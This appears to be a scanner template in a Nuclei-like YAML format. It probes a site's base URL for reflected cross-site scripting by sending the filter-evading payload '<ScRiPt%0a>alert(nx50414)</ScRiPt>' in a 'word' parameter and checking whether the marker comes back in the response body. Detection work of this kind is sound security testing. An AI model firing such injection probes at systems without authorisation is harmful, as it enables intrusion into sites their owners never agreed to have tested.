id: xss5-0415
name: 'Raw XSS5 in word'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in word'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      word:
        - '<ScRiPt%0a>alert(nx50414)</ScRiPt>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx50414'
